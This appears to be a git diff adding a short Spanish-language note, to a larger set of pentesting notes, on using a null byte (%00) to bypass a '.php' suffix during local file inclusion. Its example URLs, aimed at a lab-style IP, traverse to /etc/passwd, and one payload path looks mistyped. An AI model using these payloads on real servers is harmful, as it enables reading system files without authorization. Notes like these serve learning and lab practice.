@@ -223,6 +223,30 @@ arriba donde pone uname
 
 Author: [https://github.com/mm0r1](https://github.com/mm0r1)
 
+
+## Byte nulo
+
+Es una manera de cortar toda la información que prosigue, en unvio de data.
+
+http://10.10.10.62:4/index.php?page=home
+
+Esto apunta a home y podemos probar 
+
+http://10.10.10.62:4/home.php
+
+Hasta aquí todo normal, pero en caso de que se este dando un lfi
+
+http://10.10.10.62:4/index.php?page=../../../../etc/passwd 
+
+Es muy probable que evada este lfi si no le añadimos un byte nulo, por la simple razon
+de que el servidor es muy probable que este juntando "home" + ".php" de tal manera hará
+passwd.php y no queremos eso.
+
+Solucion:
+http://10.10.10.62:4/index.php?page=../../:./etc/passwd%00
+
+
+
 ## docker
 
 Primero iniciamos el demonio de docker 
